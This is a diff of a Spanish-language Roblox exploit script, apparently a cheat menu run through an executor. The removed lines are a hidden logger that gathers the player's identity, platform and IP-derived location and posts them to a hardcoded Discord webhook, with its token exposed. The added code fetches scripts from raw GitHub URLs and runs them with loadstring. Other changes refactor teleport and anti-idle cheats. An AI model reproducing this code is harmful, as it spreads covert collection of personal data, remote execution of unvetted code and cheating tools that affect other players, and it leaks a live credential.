@@ -1,10 +1,5 @@
-local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local MarketplaceService = game:GetService("MarketplaceService")
-local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
-
-local webhookURL = "https://discord.com/api/webhooks/1455772462116503633/2-yWQzP8kxsmS4Yazqsh6-iknnOchc59KkDkMoWcZgnepL9zkm7DNgJxQ6f_xZMIb5kb"
 
 local whitelist = {
     ["XxEzeck13xX"] = true,
@@ -19,147 +14,6 @@ if not whitelist[LocalPlayer.Name] then
     return
 end
 
-local username = LocalPlayer.Name
-local userId = LocalPlayer.UserId
-local accountAgeDays = LocalPlayer.AccountAge or 0
-
-local profileURL = "https://www.roblox.com/users/" .. userId .. "/profile"
-local avatarURL = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
-
-local hasPremium = false
-pcall(function()
-    hasPremium = MarketplaceService:UserOwnsGamePassAsync(LocalPlayer.UserId, 131392)
-end)
-
-local platform = "Unknown"
-pcall(function()
-    platform = tostring(UserInputService:GetPlatform() or "Unknown")
-end)
-
-local placeId = game.PlaceId
-local gameURL = "https://www.roblox.com/games/" .. placeId
-local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(placeId)
-local placeName = gameInfo.Name
-
-local executorName = identifyexecutor and identifyexecutor() or "Unknown"
-
-local function getIPInfo()
-    local ipData = {
-        ip = "Unknown",
-        country = "Unknown",
-        region = "Unknown",
-        city = "Unknown",
-        isp = "Unknown",
-        timezone = "Unknown"
-    }
-    
-    local success, result = pcall(function()
-        local response
-        if http_request then
-            response = http_request({
-                Url = "http://ip-api.com/json/",
-                Method = "GET"
-            })
-        elseif syn and syn.request then
-            response = syn.request({
-                Url = "http://ip-api.com/json/",
-                Method = "GET"
-            })
-        elseif request then
-            response = request({
-                Url = "http://ip-api.com/json/",
-                Method = "GET"
-            })
-        else
-            return ipData
-        end
-        
-        if response and response.Body then
-            local decoded = HttpService:JSONDecode(response.Body)
-            if decoded.status == "success" then
-                ipData.ip = decoded.query or "Unknown"
-                ipData.country = decoded.country or "Unknown"
-                ipData.region = decoded.regionName or "Unknown"
-                ipData.city = decoded.city or "Unknown"
-                ipData.isp = decoded.isp or "Unknown"
-                ipData.timezone = decoded.timezone or "Unknown"
-            end
-        end
-        
-        return ipData
-    end)
-    
-    if not success then
-        warn("Error al obtener información de IP: " .. tostring(result))
-    end
-    
-    return ipData
-end
-
-local ipInfo = getIPInfo()
-
-local data = {
-    username = "Script Logger",
-    embeds = {{
-        title = "Execution Log",
-        description = string.format("**[%s](%s)** ejecutó el script", LocalPlayer.DisplayName, profileURL),
-        color = 0x9B59B6,
-        fields = {
-            {
-                name = "Player Info",
-                value = "**Display Name:** " .. LocalPlayer.DisplayName ..
-                        "\n**Username:** " .. LocalPlayer.Name ..
-                        "\n**User ID:** " .. LocalPlayer.UserId ..
-                        "\n**Profile:** [Click Here](" .. profileURL .. ")" ..
-                        "\n**Account Age:** " .. accountAgeDays .. " days" ..
-                        "\n**Premium:** " .. (hasPremium and "✅ Yes" or "❌ No") ..
-                        "\n**Platform:** " .. platform,
-                inline = false
-            },
-            {
-                name = "Game Info",
-                value = "**Game Name:** [" .. placeName .. "](" .. gameURL .. ")" ..
-                        "\n**Game ID:** " .. placeId ..
-                        "\n**Job ID:** " .. game.JobId ..
-                        "\n**Executor:** " .. executorName,
-                inline = false
-            },
-            {
-                name = "IP Information",
-                value = "**IP Address:** `" .. ipInfo.ip .. "`" ..
-                        "\n**Country:** " .. ipInfo.country ..
-                        "\n**Region:** " .. ipInfo.region ..
-                        "\n**City:** " .. ipInfo.city ..
-                        "\n**ISP:** " .. ipInfo.isp ..
-                        "\n**Timezone:** " .. ipInfo.timezone,
-                inline = false
-            }
-        },
-        thumbnail = {
-            url = avatarURL
-        },
-        footer = { 
-            text = "Ezeck's Script • Logs" 
-        },
-        timestamp = DateTime.now():ToIsoDate()
-    }}
-}
-
-local body = HttpService:JSONEncode(data)
-
-local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
-
-if request then
-    request({
-        Url = webhookURL,
-        Method = "POST",
-        Headers = { ["Content-Type"] = "application/json" },
-        Body = body
-    })
-else
-    warn("Tu ejecutor no soporta solicitudes HTTP.")
-end
-
 local Player = Players.LocalPlayer
 local player = game.Players.LocalPlayer
 local VirtualInputManager = game:GetService("VirtualInputManager")
@@ -169,6 +23,7 @@ local leaderstats = player:WaitForChild("leaderstats")
 local rebirthsStat = leaderstats:WaitForChild("Rebirths")
 
 local VirtualUser = game:GetService("VirtualUser")
+
 
 LocalPlayer.Idled:Connect(function()
     VirtualUser:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
@@ -2266,42 +2121,44 @@ switch:Set(false)
 
 KillingTab:AddLabel("Puch Dead").TextSize = 22
 
+local PunchBoostEnabled = false
+local PunchBoostTask = nil
+
+local PunchBoostURLs = {
+    "https://raw.githubusercontent.com/Sherya-Script-Private/Muerto/refs/heads/main/Punch1",
+    "https://raw.githubusercontent.com/Sherya-Script-Private/Muerto/refs/heads/main/puch2",
+    "https://raw.githubusercontent.com/Sherya-Script-Private/Muerto/refs/heads/main/punch3",
+    "https://raw.githubusercontent.com/Sherya-Script-Private/Muerto/refs/heads/main/punch4",
+    "https://raw.githubusercontent.com/Sherya-Script-Private/Muerto/refs/heads/main/punch5",
+    "https://raw.githubusercontent.com/Sherya-Script-Private/Muerto/refs/heads/main/punch6"
+}
+
 KillingTab:AddSwitch("Punch Whit Egg", function(Value)
-    _G.PunchBoostActive = Value
-    
+    PunchBoostEnabled = Value
+
     if Value then
-        local urls = {
-            "https://raw.githubusercontent.com/Sherya-Script-Private/Muerto/refs/heads/main/Punch1 ",
-            "https://raw.githubusercontent.com/Sherya-Script-Private/Muerto/refs/heads/main/puch2",
-            "https://raw.githubusercontent.com/Sherya-Script-Private/Muerto/refs/heads/main/punch3",
-            "https://raw.githubusercontent.com/Sherya-Script-Private/Muerto/refs/heads/main/punch4",
-            "https://raw.githubusercontent.com/Sherya-Script-Private/Muerto/refs/heads/main/punch5",
-            "https://raw.githubusercontent.com/Sherya-Script-Private/Muerto/refs/heads/main/punch6"
-        }
-        
-        task.spawn(function()
-            for i, url in ipairs(urls) do
-                if not _G.PunchBoostActive then break end
-                
-                local success, result = pcall(function()
+        if PunchBoostTask then return end
+
+        PunchBoostTask = task.spawn(function()
+            for i, url in ipairs(PunchBoostURLs) do
+                if not PunchBoostEnabled then break end
+
+                local ok, err = pcall(function()
                     loadstring(game:HttpGet(url, true))()
-                    print("Punch Boost Script " .. i .. " cargado exitosamente")
                 end)
-                
-                if not success then
-                    warn("Error cargando script " .. i .. ": " .. tostring(result))
+
+                if not ok then
+                    warn("Error cargando Punch Script " .. i .. ":", err)
                 end
-                
+
                 task.wait(0.5)
             end
-            
-            if _G.PunchBoostActive then
-                print("Todos los Punch Boost Scripts han sido cargados")
-            end
+
+            PunchBoostTask = nil
         end)
-        
     else
-        print("Punch Boost Scripts desactivados")
+        PunchBoostEnabled = false
+        PunchBoostTask = nil
     end
 end, "Activa scripts especiales de punch boost desde URLs externas")
 
@@ -2666,72 +2523,39 @@ local extraTab = window:AddTab("Extras")
 
 extraTab:AddLabel("Good Mode System").TextSize = 24
 
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
-local following = false
-local followTarget = nil
-
-local function followPlayer(targetPlayer)
-    local myChar = LocalPlayer.Character
-    local targetChar = targetPlayer.Character
-
-    if not (myChar and targetChar) then return end
-    local myHRP = myChar:FindFirstChild("HumanoidRootPart")
-    local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
-
-    if myHRP and targetHRP then
-        local followPos = targetHRP.Position - (targetHRP.CFrame.LookVector * 3)
-        myHRP.CFrame = CFrame.new(followPos, targetHRP.Position)
-    end
+local function GetHRP(plr)
+    local char = plr.Character or plr.CharacterAdded:Wait()
+    return char:WaitForChild("HumanoidRootPart")
 end
 
-local followDropdown = extraTab:AddDropdown("Teleport player", function(selectedDisplayName)
-    if selectedDisplayName and selectedDisplayName ~= "" then
-        local target = nil
-        for _, plr in ipairs(Players:GetPlayers()) do
-            if plr.DisplayName == selectedDisplayName then
-                target = plr
-                break
-            end
-        end
+local followDropdown = extraTab:AddDropdown("Teleport player", function(displayName)
+    if not displayName or displayName == "" then return end
 
-        if target then
-            followTarget = target.Name
-            following = true
-            print("Started following:", target.Name)
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer and plr.DisplayName == displayName then
+            local targetHRP = GetHRP(plr)
+            local myHRP = GetHRP(LocalPlayer)
 
-            -- TP inmediato
-            followPlayer(target)
+            local pos = targetHRP.Position - (targetHRP.CFrame.LookVector * 3)
+            myHRP.CFrame = CFrame.new(pos, targetHRP.Position)
+            break
         end
     end
 end)
 
-for _, player in ipairs(Players:GetPlayers()) do
-    if player ~= LocalPlayer then
-        followDropdown:Add(player.DisplayName)
-    end
-end
-
-Players.PlayerAdded:Connect(function(player)
-    if player ~= LocalPlayer then
-        followDropdown:Add(player.DisplayName)
-    end
-end)
-
-Players.PlayerRemoving:Connect(function(player)
+-- Llenar dropdown
+local function RefreshPlayers()
     followDropdown:Clear()
     for _, plr in ipairs(Players:GetPlayers()) do
         if plr ~= LocalPlayer then
             followDropdown:Add(plr.DisplayName)
         end
     end
+end
 
-    if followTarget == player.Name then
-        followTarget = nil
-        following = false
-    end
-end)
+RefreshPlayers()
+Players.PlayerAdded:Connect(RefreshPlayers)
+Players.PlayerRemoving:Connect(RefreshPlayers)
 
 extraTab:AddButton("Do not follow", function()
     following = false
@@ -2793,16 +2617,9 @@ end)
 extraTab:AddLabel("")
 
 extraTab:AddButton("Empty", function()
-    local player = game.Players.LocalPlayer
-    local character = player.Character or player.CharacterAdded:Wait()
-    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
-    humanoidRootPart.CFrame = CFrame.new(-241.12, -369.25, -396.96)
-    
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "Teletransporte",
-        Text = "Teleported to Coordenadas (-241, -369, -396)",
-        Duration = 3
-    })
+    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    char:WaitForChild("HumanoidRootPart").CFrame =
+        CFrame.new(-241.12, -369.25, -396.96)
 end)
 
 extraTab:AddLabel("")
